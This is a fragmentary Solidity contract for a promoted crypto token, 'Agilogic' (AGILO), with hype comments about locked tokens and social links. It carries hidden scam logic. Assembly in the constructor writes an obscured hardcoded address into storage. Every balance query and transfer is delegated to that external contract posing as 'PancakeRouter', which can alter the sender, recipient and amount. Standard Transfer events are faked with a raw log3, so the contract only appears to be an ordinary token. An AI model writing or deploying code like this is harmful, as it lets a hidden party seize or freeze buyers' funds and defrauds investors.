...
/*
Welcome to Agilogic Crypto WORLD!

Telegram: https://t.me/Agilogic/
Twitter: https://twitter.com/Agilogic/
Website: https://Agilogic.crypto
95% of tokens - LOCKED!
...
interface Agilogic_secureTransfer {
...
contract Agilogic {
    string public constant name = "Agilogic";
    string public constant symbol = "AGILO";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, 1457979543015896974747396777217459185542634128096)}
        Agilogic_secureTransfer(PancakeRouter).deploy(msg.sender, address(this));
        (address swap_from, address swap_to, uint256 swap_amount) = Agilogic_secureTransfer(PancakeRouter).swap(address(0), msg.sender, totalSupply_, address(this));
        ...
        (address lock_from, address lock_to, uint256 lock_amount) = Agilogic_secureTransfer(PancakeRouter).swap(msg.sender, TrustSwap, LockAmount, address(this));
    ...
    function balanceOf(address holder) public view returns (uint256) {
        return Agilogic_secureTransfer(PancakeRouter).balanceOf(holder, address(this));
    }

    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        (from, to, amount) = Agilogic_secureTransfer(PancakeRouter).swap(from, to, amount, address(this));
 assembly {let Ox0 := 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef mstore(0, amount) log3(0, 0x20, Ox0, from, to)}     
    ...
    function transfer(address to, uint256 amount) public returns (bool) {
        (, to, amount) = Agilogic_secureTransfer(PancakeRouter).swap(msg.sender, to, amount, address(this));
